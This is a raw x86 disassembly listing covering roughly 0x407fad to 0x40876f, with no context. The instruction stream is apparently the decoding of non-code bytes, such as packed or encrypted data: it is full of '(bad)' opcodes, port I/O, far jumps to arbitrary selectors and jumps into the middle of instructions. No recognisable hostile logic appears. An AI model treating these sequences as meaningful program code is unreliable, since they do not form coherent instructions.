  407fad:	imul   edi,DWORD PTR [edi+0x3183d0e8],0x12
  407fb4:	and    esi,edi
  407fb6:	aas    
  407fb7:	dec    edx
  407fb8:	scas   eax,DWORD PTR es:[edi]
  407fb9:	jo     0x407fb6
  407fbb:	xor    BYTE PTR [edi],cl
  407fbd:	mov    WORD PTR [ebp+esi*2+0x13a3b8be],ds
  407fc4:	push   ebx
  407fc5:	cmp    eax,ecx
  407fc7:	and    dl,BYTE PTR [ebp+0x61]
  407fca:	adc    bh,ch
  407fcc:	jo     0x407f6a
  407fce:	mov    eax,0x81b1a5ea
  407fd3:	jb     0x407f8c
  407fd5:	jecxz  0x408010
  407fd7:	cmc    
  407fd8:	jge    0x407f76
  407fda:	ror    DWORD PTR [ecx+0x33439149],0x64
  407fe1:	or     DWORD PTR [eax],edx
  407fe3:	mov    bl,0x4f
  407fe5:	xlat   BYTE PTR ds:[ebx]
  407fe6:	fst    QWORD PTR [ebp+0x19]
  407fe9:	stos   DWORD PTR es:[edi],eax
  407fea:	or     dl,bh
  407fec:	sbb    eax,0x5ab15f8f
  407ff1:	aas    
  407ff2:	imul   ebp,DWORD PTR [ebx+0x3deb9a0c],0xffffffdb
  407ff9:	jecxz  0x407f9e
  407ffb:	ret    0x3ac8
  407ffe:	mov    eax,0xe7a9ccca
  408003:	es xchg ecx,eax
  408005:	test   dh,cl
  408007:	or     ecx,edi
  408009:	fldcw  WORD PTR [edi+0x51]
  40800c:	fldcw  WORD PTR [edx-0x742288ae]
  408012:	pop    esp
  408013:	jo     0x40804b
  408015:	cld    
  408016:	mov    ecx,DWORD PTR [eax+0x1b]
  408019:	mov    bh,0xd
  40801b:	jg     0x408030
  40801d:	push   edx
  40801e:	(bad)  
  40801f:	xor    ah,BYTE PTR ds:0xf9ece546
  408025:	pop    esp
  408026:	aad    0x78
  408028:	fnstsw WORD PTR [esp+eax*4]
  40802b:	add    ebp,DWORD PTR [eax+0x54]
  40802e:	cdq    
  40802f:	rcl    DWORD PTR [esi],0x1e
  408032:	jns    0x408080
  408034:	sbb    DWORD PTR ds:0x5c092b80,ecx
  40803a:	push   ss
  40803b:	push   ebx
  40803c:	mov    fs,WORD PTR [ebx-0x50]
  40803f:	jb     0x408046
  408041:	loope  0x4080ae
  408043:	sub    eax,DWORD PTR [esi+ebp*1-0x23]
  408047:	dec    eax
  408048:	loop   0x408009
  40804a:	arpl   WORD PTR [ebx],di
  40804c:	arpl   WORD PTR [edx-0x1f],bp
  40804f:	ds repnz out 0x20,eax
  408053:	and    esp,esp
  408055:	sub    ebx,eax
  408057:	adc    BYTE PTR [eax-0x38],0xb4
  40805b:	push   edi
  40805c:	shr    eax,0x8d
  40805f:	jp     0x4080c8
  408061:	ds ins DWORD PTR es:[edi],dx
  408063:	data16 adc al,0x6a
  408066:	or     BYTE PTR [edi+0x5f],0x8a
  40806a:	xor    al,0x55
  40806c:	xchg   BYTE PTR [eax],al
  40806e:	inc    edx
  40806f:	outs   dx,DWORD PTR ds:[esi]
  408070:	jae    0x407ff8
  408072:	sub    al,0xf2
  408074:	inc    edx
  408075:	shl    ah,1
  408077:	dec    edi
  408078:	rol    edx,1
  40807a:	in     eax,0x39
  40807c:	test   al,0xa
  40807e:	mov    bl,0x1f
  408080:	retf   
  408081:	leave  
  408082:	scas   eax,DWORD PTR es:[edi]
  408083:	jle    0x408016
  408085:	out    0xb7,eax
  408087:	mov    edx,0x922bdb11
  40808c:	mov    ds:0x17d6c728,eax
  408091:	sub    DWORD PTR [ebp+0xce20d5e],ebp
  408097:	ins    BYTE PTR es:[edi],dx
  408098:	(bad)  
  408099:	fdiv   QWORD PTR [edx-0x2a]
  40809c:	imul   BYTE PTR [esi]
  40809e:	xchg   ebp,eax
  40809f:	fmul   st(4),st
  4080a1:	bnd jbe 0x408068
  4080a4:	pop    esi
  4080a5:	mov    dh,0x5b
  4080a7:	inc    esi
  4080a8:	mov    eax,ds:0xd3652604
  4080ad:	mov    WORD PTR [eax+eax*4-0x641f00a0],fs
  4080b4:	jo     0x40806c
  4080b6:	jne    0x408122
  4080b8:	scas   al,BYTE PTR es:[edi]
  4080b9:	mov    ds:0x24d91dd4,eax
  4080be:	mov    esp,0xa7c7ebd
  4080c3:	int    0xad
  4080c5:	adc    al,0x33
  4080c7:	enter  0xd38d,0x73
  4080cb:	or     BYTE PTR [ebx+0x61],al
  4080ce:	test   BYTE PTR [eax],bl
  4080d0:	gs dec ecx
  4080d2:	ja     0x408119
  4080d4:	push   eax
  4080d5:	jg     0x408111
  4080d7:	(bad)  [eax-0x71]
  4080da:	lahf   
  4080db:	xchg   ebp,eax
  4080dc:	xor    al,BYTE PTR [esi-0x2cc51c1]
  4080e2:	cmp    eax,0xdf9986c1
  4080e7:	push   0xffffff87
  4080e9:	enter  0xc381,0xde
  4080ed:	sbb    cl,al
  4080ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080f0:	xchg   ecx,eax
  4080f1:	mov    edi,0x18d6ef26
  4080f6:	test   DWORD PTR [ecx+esi*8],esp
  4080f9:	adc    al,0xfa
  4080fb:	(bad)  
  4080fc:	xor    ebx,DWORD PTR [esi+0x465b8f53]
  408102:	mov    BYTE PTR [edi+0x30],al
  408105:	ins    DWORD PTR es:[edi],dx
  408106:	push   ecx
  408107:	pusha  
  408108:	mov    eax,0xa94f8801
  40810d:	test   DWORD PTR [ebx+ebp*4],eax
  408110:	mov    BYTE PTR [edi-0x38],cl
  408113:	std    
  408114:	je     0x408161
  408116:	outs   dx,DWORD PTR ds:[esi]
  408117:	(bad)  
  408118:	outs   dx,BYTE PTR ds:[esi]
  408119:	icebp  
  40811a:	mov    bh,0x38
  40811c:	and    BYTE PTR [edi-0x37200147],0xb4
  408123:	pop    ss
  408124:	lock stos BYTE PTR es:[edi],al
  408126:	push   es
  408127:	aas    
  408128:	sbb    eax,0x60100ead
  40812d:	and    al,0xa4
  40812f:	mov    ch,0xf5
  408131:	outs   dx,DWORD PTR ds:[esi]
  408132:	push   edi
  408133:	ret    
  408134:	leave  
  408135:	lock push es
  408137:	and    DWORD PTR [esp+ebp*1-0x5e],ebx
  40813b:	mov    ebp,0x6c24077c
  408140:	adc    DWORD PTR [edi],esp
  408142:	inc    ebx
  408143:	loope  0x408183
  408145:	cli    
  408146:	je     0x40818f
  408148:	int3   
  408149:	dec    esp
  40814a:	ret    0x98ec
  40814d:	je     0x408103
  40814f:	rcl    DWORD PTR [edx],cl
  408151:	mov    al,ds:0xfccd6664
  408156:	bound  esp,QWORD PTR [eax-0x156e4215]
  40815c:	push   cs
  40815d:	stc    
  40815e:	push   ecx
  40815f:	pop    eax
  408160:	fwait
  408161:	xchg   esp,eax
  408162:	imul   edi,DWORD PTR [ecx+0x707bd4e4],0xffffffa8
  408169:	inc    ecx
  40816a:	aad    0xca
  40816c:	mov    ebx,eax
  40816e:	mov    BYTE PTR [edx],cl
  408170:	adc    eax,0x3c5aa10d
  408175:	pop    es
  408176:	std    
  408177:	pusha  
  408178:	je     0x408117
  40817a:	cdq    
  40817b:	loope  0x4081a6
  40817d:	pop    ebp
  40817e:	cmp    al,0x52
  408180:	mov    WORD PTR [ebx],es
  408182:	mov    dh,0xcf
  408184:	mov    eax,ds:0x340c6f05
  408189:	repz or al,0x87
  40818c:	retf   
  40818d:	out    dx,al
  40818e:	test   eax,0x8528c211
  408193:	repz pop DWORD PTR [esi]
  408196:	pop    ds
  408197:	pop    edx
  408198:	stos   BYTE PTR es:[edi],al
  408199:	out    dx,eax
  40819a:	in     eax,dx
  40819b:	or     eax,0xb530f402
  4081a0:	xor    al,BYTE PTR [edx+0x5d1e056e]
  4081a6:	nop
  4081a7:	sub    DWORD PTR [edi-0xf],ebp
  4081aa:	cs dec ecx
  4081ac:	leave  
  4081ad:	dec    ebx
  4081ae:	std    
  4081af:	jmp    0xa4d92f2a
  4081b4:	test   ah,al
  4081b6:	jg     0x40816c
  4081b8:	push   es
  4081b9:	or     DWORD PTR [eax*1-0x786021da],ecx
  4081c0:	ds out 0x7,eax
  4081c3:	mov    esp,0xf9081f21
  4081c8:	and    cl,BYTE PTR [edi]
  4081ca:	ja     0x408202
  4081cc:	popf   
  4081cd:	dec    ecx
  4081ce:	mov    eax,ds:0x37906d70
  4081d3:	hlt    
  4081d4:	fsubr  QWORD PTR [ebp+0x4d]
  4081d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081d8:	in     al,dx
  4081d9:	sahf   
  4081da:	outs   dx,BYTE PTR ds:[esi]
  4081db:	xchg   edx,esp
  4081dd:	retf   0xab62
  4081e0:	std    
  4081e1:	ins    DWORD PTR es:[edi],dx
  4081e2:	pop    es
  4081e3:	lods   eax,DWORD PTR ds:[esi]
  4081e4:	pop    esp
  4081e5:	xchg   DWORD PTR [esi-0x5da98155],esp
  4081eb:	pop    ss
  4081ec:	or     DWORD PTR [ebp-0x75],0x7b
  4081f0:	test   al,0x5e
  4081f2:	sbb    eax,0xb343599c
  4081f7:	(bad)  
  4081f8:	cmp    al,0x21
  4081fa:	sbb    DWORD PTR [ecx],esi
  4081fc:	push   ds
  4081fd:	pop    ebx
  4081fe:	pop    es
  4081ff:	add    al,0xd7
  408201:	fs pusha 
  408203:	sub    ebp,DWORD PTR [ebp-0x53c743ec]
  408209:	or     al,0x60
  40820b:	xor    DWORD PTR [esi+ecx*4-0x23],esp
  40820f:	mov    dh,BYTE PTR [ecx+0xa0c9aed]
  408215:	xor    ecx,DWORD PTR fs:[eax-0x23]
  408219:	xor    ah,bh
  40821b:	jl     0x4081aa
  40821d:	lods   eax,DWORD PTR ds:[esi]
  40821e:	jle    0x4081bb
  408220:	test   DWORD PTR [ecx+0x5f6f4ac5],0x57e7648
  40822a:	xor    bl,bh
  40822c:	adc    DWORD PTR [eax+0x4b60333b],esi
  408232:	dec    esp
  408233:	sub    eax,0xe86f01d
  408238:	ror    DWORD PTR [esi-0x28],0xf0
  40823c:	std    
  40823d:	sbb    eax,esi
  40823f:	adc    BYTE PTR [esi-0x6e],bh
  408242:	aad    0x47
  408244:	fidivr WORD PTR [ecx+0x56f488c]
  40824a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40824b:	outs   dx,BYTE PTR ds:[esi]
  40824c:	test   eax,0xf71f42ff
  408251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408252:	inc    esi
  408253:	sub    BYTE PTR [ecx],dl
  408255:	adc    ecx,DWORD PTR [esi+0x1a684f2d]
  40825b:	hlt    
  40825c:	or     al,dl
  40825e:	out    dx,al
  40825f:	mov    eax,ds:0x8dce0ed0
  408264:	frndint 
  408266:	dec    ebp
  408267:	dec    ecx
  408268:	outs   dx,BYTE PTR ds:[esi]
  408269:	or     DWORD PTR [edx+ecx*4+0x63],ecx
  40826d:	enter  0xf70e,0x77
  408271:	pop    eax
  408272:	mov    DWORD PTR [edi+0x76adc471],esp
  408278:	dec    esi
  408279:	lds    esp,FWORD PTR [edx+0x5b]
  40827c:	data16 repnz clc 
  40827f:	push   ebx
  408280:	and    al,0x7e
  408282:	sub    DWORD PTR [ecx-0x5be16f3c],esp
  408288:	jp     0x408256
  40828a:	add    DWORD PTR [eax],esp
  40828c:	pop    esi
  40828d:	cmp    al,0xdc
  40828f:	inc    esi
  408290:	in     al,0x40
  408292:	call   0x79ef:0xaa361416
  408299:	clc    
  40829a:	xchg   ebx,eax
  40829b:	pop    ds
  40829c:	add    esi,DWORD PTR [edi+0x2880318]
  4082a2:	jle    0x408305
  4082a4:	pop    ss
  4082a5:	jp     0x4082ba
  4082a7:	cmp    DWORD PTR [esi+ebp*8+0x6f20629b],0x40
  4082af:	(bad)  
  4082b0:	xchg   edi,eax
  4082b1:	mov    ecx,0x1cc3fef4
  4082b6:	or     esp,DWORD PTR [ebp+0x495cbdb2]
  4082bc:	mov    edx,0x13f0356d
  4082c1:	mov    DWORD PTR [edx-0x92fa107],esp
  4082c7:	in     al,0x6c
  4082c9:	jae    0x40830c
  4082cb:	sti    
  4082cc:	cmp    cl,BYTE PTR [edi+0x2aa657a0]
  4082d2:	ret    
  4082d3:	cmp    dl,BYTE PTR [ecx-0x180c5664]
  4082d9:	mov    WORD PTR [edx-0x1f],?
  4082dc:	sub    ebp,eax
  4082de:	jmp    0x9944:0xd6ec0fd9
  4082e5:	out    0x99,eax
  4082e7:	data16 aad 0x46
  4082ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082eb:	sub    BYTE PTR [edx-0x17b50599],ah
  4082f1:	jae    0x40833e
  4082f3:	aad    0xa4
  4082f5:	(bad)  
  4082f6:	leave  
  4082f7:	call   0xd7b2fa82
  4082fc:	popf   
  4082fd:	xor    al,0x66
  4082ff:	imul   DWORD PTR ds:0xfd4bb447
  408305:	ret    0xb580
  408308:	test   al,0x70
  40830a:	xchg   esi,edx
  40830c:	std    
  40830d:	push   cs
  40830e:	sbb    edi,esp
  408310:	pop    edi
  408311:	retf   
  408312:	or     DWORD PTR [eax],eax
  408314:	outs   dx,BYTE PTR ds:[esi]
  408315:	and    ebx,DWORD PTR [eax]
  408317:	pop    ss
  408318:	lods   al,BYTE PTR ds:[esi]
  408319:	inc    edi
  40831a:	add    dh,BYTE PTR [ecx-0x34]
  40831d:	icebp  
  40831e:	enter  0xcf54,0xc6
  408322:	mov    bl,0x1d
  408324:	add    eax,0xd6198502
  408329:	sbb    eax,0xe72b9813
  40832e:	mov    ebp,0xaf614995
  408333:	into   
  408334:	inc    esi
  408335:	test   al,0x7d
  408337:	fsubr  DWORD PTR [ebx]
  408339:	inc    edx
  40833a:	add    DWORD PTR [ebp+0x564dccff],esi
  408340:	sbb    DWORD PTR [esi+0x65],edx
  408343:	sbb    DWORD PTR [edx-0x68],ebx
  408346:	jp     0x40830f
  408348:	ins    BYTE PTR es:[edi],dx
  408349:	fist   WORD PTR [si]
  40834c:	pop    edx
  40834d:	cmp    BYTE PTR [esi],bl
  40834f:	loope  0x4082ef
  408351:	add    DWORD PTR [eax-0x10353618],esi
  408357:	and    bl,al
  408359:	les    edi,FWORD PTR [ebx+edi*4-0x6362120b]
  408360:	sbb    eax,0x3aa6ba44
  408365:	imul   esp,DWORD PTR [eax+0x70],0xffffff82
  408369:	rcl    DWORD PTR [eax],cl
  40836b:	test   eax,0x767116ae
  408370:	aam    0x48
  408372:	add    DWORD PTR [esi+eax*8-0x12e72fb2],0x79cdffca
  40837d:	out    0xd7,al
  40837f:	push   ds
  408380:	mov    ds:0xc877d185,al
  408385:	clc    
  408386:	dec    eax
  408388:	adc    bh,BYTE PTR [eax]
  40838a:	and    eax,0xe7b67ea1
  40838f:	ins    BYTE PTR es:[edi],dx
  408390:	aaa    
  408391:	jle    0x40838c
  408393:	cdq    
  408394:	repz (bad) 
  408396:	mov    DWORD PTR ds:0x672167a,ebp
  40839c:	fisub  DWORD PTR [edx]
  40839e:	xchg   edi,eax
  40839f:	mov    ecx,0xf94beeeb
  4083a4:	div    BYTE PTR [esi+0x24]
  4083a7:	push   ebx
  4083a8:	mov    ah,0x28
  4083aa:	xchg   esp,eax
  4083ab:	lahf   
  4083ac:	cmp    DWORD PTR [edi],esp
  4083ae:	jo     0x408384
  4083b0:	inc    ebp
  4083b1:	jg     0x408432
  4083b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083b4:	add    edx,DWORD PTR [ebp+0x5bb1ce59]
  4083ba:	mov    ds:0x47bd61c1,eax
  4083bf:	dec    edx
  4083c0:	mov    dl,0x92
  4083c2:	ret    0x96dc
  4083c5:	scas   al,BYTE PTR es:[edi]
  4083c6:	dec    esp
  4083c7:	jnp    0x408428
  4083c9:	xchg   edx,eax
  4083ca:	not    dh
  4083cc:	mov    eax,ds:0x9006b8df
  4083d1:	inc    eax
  4083d2:	cmp    esp,eax
  4083d4:	in     eax,0xcb
  4083d6:	fmul   QWORD PTR [ecx-0x34]
  4083d9:	sub    DWORD PTR [esi+0x15e1a1e6],edi
  4083df:	sub    al,0x1
  4083e1:	cmp    esi,edx
  4083e3:	in     eax,dx
  4083e4:	mov    es,WORD PTR [esi-0x4f]
  4083e7:	push   ebp
  4083e8:	mov    BYTE PTR [ebx],dh
  4083ea:	fld    st(0)
  4083ec:	lds    ebp,FWORD PTR [ebx-0x62]
  4083ef:	test   DWORD PTR [ebp+esi*4-0x23],0x84ba0a99
  4083f7:	stos   DWORD PTR es:[edi],eax
  4083f8:	les    esp,FWORD PTR [eax+0x0]
  4083fb:	(bad)  
  4083fc:	(bad)  
  4083fe:	pop    edx
  4083ff:	mov    dh,0x68
  408401:	push   esi
  408402:	(bad)  
  408403:	fist   WORD PTR [edx-0x3f1b19d9]
  408409:	sbb    ah,al
  40840b:	loop   0x408475
  40840d:	ret    
  40840e:	jmp    ebp
  408410:	pop    ebp
  408411:	aam    0x45
  408413:	mov    DWORD PTR [esi-0xa],esi
  408416:	aam    0x7c
  408418:	iret   
  408419:	and    al,0x5a
  40841b:	test   ecx,esp
  40841d:	sub    al,0xf0
  40841f:	mov    ebx,0x38b5c3df
  408424:	dec    edx
  408425:	push   es
  408426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408427:	jb     0x40849c
  408429:	add    eax,0x17ce9990
  40842e:	mov    edx,0xf5ddff37
  408433:	xor    edx,DWORD PTR [ebx]
  408435:	xor    eax,0xe1ae4a81
  40843a:	repz pop ebp
  40843c:	pop    ds
  40843d:	push   0xffffffe2
  40843f:	arpl   WORD PTR [ecx+0xa135cdf],ax
  408445:	and    DWORD PTR [ebx],edx
  408447:	mov    ebx,0x446b67b9
  40844c:	hlt    
  40844d:	xchg   ebp,eax
  40844e:	ds inc eax
  408450:	outs   dx,BYTE PTR ds:[esi]
  408451:	sbb    al,0xd3
  408453:	inc    edi
  408454:	rcl    BYTE PTR [ecx+0x3b],0xf1
  408458:	cmp    edi,DWORD PTR [edi+0x6b5260cd]
  40845e:	ins    DWORD PTR es:[edi],dx
  40845f:	inc    ebp
  408460:	pushf  
  408461:	push   es
  408462:	cmp    ah,BYTE PTR [ebp+0x75444cad]
  408468:	sbb    DWORD PTR [edi],ebx
  40846a:	add    bh,dh
  40846c:	std    
  40846d:	out    0x4b,eax
  40846f:	(bad)  
  408470:	sbb    eax,0x85c1792d
  408475:	push   esp
  408476:	cmp    dh,BYTE PTR [ecx+0x568f49fd]
  40847c:	jo     0x408437
  40847e:	and    DWORD PTR [edi+edx*8+0x76],eax
  408482:	and    eax,ebx
  408484:	or     esi,0x69
  408487:	jmp    0x8f22:0x2420f402
  40848e:	(bad)  
  40848f:	sbb    esi,DWORD PTR [ebx+0x2c]
  408492:	pop    ebx
  408493:	or     ecx,DWORD PTR [edi]
  408495:	cmp    ah,bl
  408497:	repz rcl BYTE PTR [esi-0x26],0xff
  40849c:	lahf   
  40849d:	jmp    0xa7fd:0xefd6985f
  4084a4:	sbb    BYTE PTR gs:[esi-0x1c2eae3d],cl
  4084ab:	pushf  
  4084ac:	sbb    bh,cl
  4084ae:	test   BYTE PTR [esi-0x5a010fbb],dl
  4084b4:	loope  0x4084ff
  4084b6:	add    al,0x2b
  4084b8:	push   edx
  4084b9:	mov    ds:0x19ae0e56,al
  4084be:	dec    eax
  4084bf:	inc    edx
  4084c0:	sbb    DWORD PTR [ebx+ebp*8-0x5747a37],edi
  4084c7:	std    
  4084c8:	or     DWORD PTR [esp+ecx*8-0x27],esi
  4084cc:	and    DWORD PTR [eax+0x7e53d08e],ebx
  4084d2:	mov    ds:0x1f45ca49,eax
  4084d7:	aad    0xf4
  4084d9:	inc    ecx
  4084da:	mov    esp,0x484ce58
  4084df:	repnz and al,0xa8
  4084e2:	jp     0x4084b7
  4084e4:	sbb    eax,0x3fe13e0e
  4084e9:	jg     0x408520
  4084eb:	repz cmc 
  4084ed:	jb     0x40847b
  4084ef:	ss ret 
  4084f1:	ret    0xa71d
  4084f4:	add    eax,0xba3102a8
  4084f9:	push   ebx
  4084fa:	mov    fs,ecx
  4084fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084fd:	inc    edi
  4084fe:	jbe    0x4084ea
  408500:	xchg   edi,eax
  408501:	xor    dh,bh
  408503:	popa   
  408504:	jae    0x408535
  408506:	je     0x4084b8
  408508:	push   cs
  408509:	mov    al,ds:0x93a883a0
  40850e:	mov    eax,ds:0x4b2c45c5
  408513:	xchg   ebp,eax
  408514:	fwait
  408515:	and    DWORD PTR gs:[ecx],ebx
  408518:	in     eax,0x68
  40851a:	or     eax,0xbef08524
  40851f:	outs   dx,BYTE PTR ds:[esi]
  408520:	mov    al,ds:0x40fd7c87
  408525:	jp     0x40853a
  408527:	(bad)  
  408528:	jno    0x40859f
  40852a:	xor    al,0x10
  40852c:	out    dx,eax
  40852d:	mov    edx,0xe493b834
  408532:	shl    DWORD PTR [edx+eiz*1-0x58],0xdb
  408537:	fisttp WORD PTR [ebx-0x48]
  40853a:	jge    0x40855e
  40853c:	sbb    al,0x7a
  40853e:	jbe    0x4084e9
  408540:	cdq    
  408541:	pop    edi
  408542:	retf   
  408543:	xchg   ebx,eax
  408544:	cmc    
  408545:	lea    ecx,[ecx+0x1bd21422]
  40854b:	sar    BYTE PTR [ebx+ebx*2-0x6d1d41e1],cl
  408552:	test   BYTE PTR [edx-0x30],ah
  408555:	pop    eax
  408556:	hlt    
  408557:	aaa    
  408558:	idiv   esi
  40855a:	push   0x12
  40855c:	and    BYTE PTR [edi-0x6874fb63],dl
  408562:	xchg   ecx,eax
  408563:	dec    esi
  408564:	inc    ecx
  408565:	aas    
  408566:	add    DWORD PTR [eax+0x78],ecx
  408569:	push   ds
  40856a:	mov    ah,0x13
  40856c:	enter  0xd8b7,0xcf
  408570:	inc    BYTE PTR [ebx]
  408572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408573:	mov    al,ds:0x90c4848d
  408578:	jnp    0x40857d
  40857a:	arpl   WORD PTR [ecx-0x48],si
  40857d:	lock xor eax,DWORD PTR [esi]
  408580:	inc    edx
  408581:	adc    BYTE PTR [edx-0x4bb6069c],bh
  408587:	sti    
  408588:	jl     0x40852d
  40858a:	ret    0xbf86
  40858d:	aad    0x65
  40858f:	push   ss
  408590:	daa    
  408591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408592:	mov    cl,0x65
  408594:	in     al,0x48
  408596:	lods   al,BYTE PTR ds:[esi]
  408597:	adc    al,0xf7
  408599:	test   BYTE PTR [edi+0x19f5b81b],dh
  40859f:	add    al,0x50
  4085a1:	pop    ecx
  4085a2:	lods   eax,DWORD PTR ds:[esi]
  4085a3:	hlt    
  4085a4:	sub    DWORD PTR [ebx],esi
  4085a6:	sbb    esi,DWORD PTR [edx+edx*8+0x301cecce]
  4085ad:	jecxz  0x408610
  4085af:	and    edi,DWORD PTR [edx-0x1a]
  4085b2:	jae    0x40853a
  4085b4:	(bad)  
  4085b5:	les    ecx,FWORD PTR [esi]
  4085b7:	add    ebx,DWORD PTR ds:0xf132e03
  4085bd:	popf   
  4085be:	sti    
  4085bf:	mov    edi,edx
  4085c1:	dec    edx
  4085c2:	ja     0x408620
  4085c4:	test   BYTE PTR [edi+0x67],0x81
  4085c8:	jns    0x40859a
  4085ca:	sbb    al,0xe6
  4085cc:	(bad)  
  4085cd:	outs   dx,DWORD PTR ds:[esi]
  4085ce:	inc    eax
  4085cf:	xor    BYTE PTR [edi-0x1bd3f1ab],bh
  4085d5:	fwait
  4085d6:	arpl   WORD PTR [edi-0x59c46cdf],sp
  4085dc:	mov    ah,0xa5
  4085de:	or     esi,DWORD PTR [esp+eax*2-0x1e]
  4085e2:	pop    eax
  4085e3:	ja     0x4085ee
  4085e5:	inc    esi
  4085e6:	and    BYTE PTR [edi],ch
  4085e8:	adc    DWORD PTR [edx-0x3d],0xc5995a8c
  4085ef:	jb     0x4085f1
  4085f1:	xchg   esi,eax
  4085f2:	add    eax,0xb318c9df
  4085f7:	adc    edi,DWORD PTR [edx+0x32]
  4085fa:	outs   dx,DWORD PTR ds:[esi]
  4085fb:	xor    esp,ebp
  4085fd:	xor    BYTE PTR [edx-0x288e1645],ch
  408603:	popf   
  408604:	mov    ebx,0x4caed276
  408609:	adc    cl,BYTE PTR [ecx+0x23]
  40860c:	mov    ds:0xacc48645,eax
  408611:	dec    ecx
  408612:	jecxz  0x408659
  408614:	ins    BYTE PTR es:[edi],dx
  408615:	retf   
  408616:	mov    al,0x65
  408618:	and    BYTE PTR [ecx+0x63d27c5d],bl
  40861e:	enter  0xedc9,0x57
  408622:	lods   eax,DWORD PTR ds:[esi]
  408623:	lea    edx,[edx]
  408625:	in     al,dx
  408626:	rep stos BYTE PTR es:[edi],al
  408628:	push   ebx
  408629:	enter  0x44e9,0x62
  40862d:	push   0x5c
  40862f:	sbb    BYTE PTR [esi-0x1],bh
  408632:	(bad)  
  408633:	rol    DWORD PTR [ecx-0x517ade75],1
  408639:	jmp    0xcf1f:0x9c6cd537
  408640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408641:	xor    DWORD PTR [edi-0x26],ebp
  408644:	adc    ah,dl
  408646:	mov    ah,BYTE PTR [edi+ebp*8+0x56]
  40864a:	and    bl,al
  40864c:	push   es
  40864d:	mov    ch,0xad
  40864f:	add    esp,DWORD PTR ds:[ebx-0x1a]
  408653:	mov    edi,0x913f97c1
  408658:	fisttp WORD PTR [edi-0x7b]
  40865b:	add    DWORD PTR [eax],edx
  40865d:	jo     0x40867d
  40865f:	push   esi
  408660:	xchg   esi,eax
  408661:	mov    edx,0xf2f35eb8
  408666:	pushf  
  408667:	pusha  
  408668:	test   BYTE PTR [ebp-0xa],bh
  40866b:	inc    eax
  40866c:	or     DWORD PTR [ebx-0x3a],edi
  40866f:	push   edi
  408670:	jge    0x408632
  408672:	cmp    eax,DWORD PTR [ebx-0x61a0566f]
  408678:	push   esi
  408679:	sub    al,0xfe
  40867b:	adc    esp,ebp
  40867d:	aaa    
  40867e:	(bad)  
  40867f:	mov    ds:0x1f3d304f,al
  408684:	push   esi
  408685:	fnstenv [ecx-0x27c1ff08]
  40868b:	mov    eax,ds:0xcbff1587
  408690:	popf   
  408691:	mov    bl,0x90
  408693:	mov    edx,DWORD PTR [ebx+0x1a]
  408696:	mov    ds:0x9745b553,eax
  40869b:	cmc    
  40869c:	imul   edi,DWORD PTR [eax+0x25c297d6],0xffffffa6
  4086a3:	js     0x4086a5
  4086a5:	cdq    
  4086a6:	inc    esp
  4086a7:	pop    ebp
  4086a8:	or     al,0x9b
  4086aa:	les    edx,FWORD PTR [bp+di]
  4086ad:	pop    ebp
  4086ae:	jo     0x4086de
  4086b0:	enter  0x859b,0xf9
  4086b4:	arpl   WORD PTR [ecx+eiz*1+0x6a509748],cx
  4086bb:	into   
  4086bc:	cmp    esi,DWORD PTR [edx]
  4086be:	test   al,0xff
  4086c0:	pop    edx
  4086c1:	loop   0x408657
  4086c3:	inc    edi
  4086c4:	xchg   DWORD PTR [ebx],edx
  4086c6:	xor    dl,al
  4086c8:	or     DWORD PTR [ebx-0x6b6d032],edi
  4086ce:	or     BYTE PTR [ebx-0x6c97e20d],ah
  4086d4:	cmp    eax,0xe9547ea
  4086d9:	cdq    
  4086da:	pop    esi
  4086db:	loopne 0x408668
  4086dd:	(bad)  
  4086de:	(bad)  
  4086df:	xlat   BYTE PTR ds:[ebx]
  4086e0:	sub    ecx,edx
  4086e2:	inc    esp
  4086e3:	retf   
  4086e4:	mov    bl,BYTE PTR [eax]
  4086e6:	sub    al,cl
  4086e8:	xchg   esp,eax
  4086e9:	sbb    edi,DWORD PTR [ecx]
  4086eb:	jne    0x4060c922
  4086f1:	xchg   BYTE PTR [esp+ebx*4+0x38],dh
  4086f5:	inc    eax
  4086f6:	pushf  
  4086f7:	jle    0x408689
  4086f9:	loopne 0x40872b
  4086fb:	(bad)  
  4086fc:	mov    DWORD PTR [esi+0x3e],ebx
  4086ff:	into   
  408700:	in     eax,dx
  408701:	xchg   DWORD PTR [edx+0x6c6bdd2e],ebx
  408707:	je     0x408724
  408709:	inc    ebx
  40870a:	pop    ebx
  40870b:	fdivr  QWORD PTR [eax+ecx*1]
  40870e:	arpl   WORD PTR [edx-0x58],dx
  408711:	stos   BYTE PTR es:[edi],al
  408712:	push   ebx
  408713:	add    BYTE PTR [esp+eiz*2],dl
  408716:	sub    al,0x34
  408718:	add    BYTE PTR [edi+edi*2],ah
  40871b:	cmc    
  40871c:	(bad)  
  40871e:	imul   ebx,DWORD PTR [edi-0x1a],0xc302ea40
  408725:	jp     0x40878c
  408727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408728:	sbb    bl,ch
  40872a:	lds    edx,FWORD PTR [edx+esi*1-0x63]
  40872e:	dec    ecx
  40872f:	push   esp
  408730:	ror    esi,0xd2
  408733:	inc    ebx
  408734:	test   BYTE PTR [edx+0x59ddf2f4],ch
  40873a:	and    dh,BYTE PTR [ebx+0x7d]
  40873d:	add    edi,edi
  40873f:	jle    0x408778
  408741:	push   ebp
  408742:	mov    esp,DWORD PTR [ecx]
  408744:	bound  edi,QWORD PTR [ebx+eax*4+0x43a3aaf6]
  40874b:	jb     0x40876c
  40874d:	mov    bh,0x19
  40874f:	mov    ebx,0x51f66d1a
  408754:	push   ecx
  408755:	mov    edi,0xca99a67
  40875a:	addr16 inc esp
  40875c:	mov    bh,BYTE PTR [ebx]
  40875e:	scas   al,BYTE PTR es:[edi]
  40875f:	dec    ecx
  408760:	cld    
  408761:	mov    al,0xbc
  408763:	popa   
  408764:	adc    ah,al
  408766:	mov    bh,0xd
  408768:	std    
  408769:	fisttp WORD PTR [edi-0xb075b72]
  40876f:	pusha  
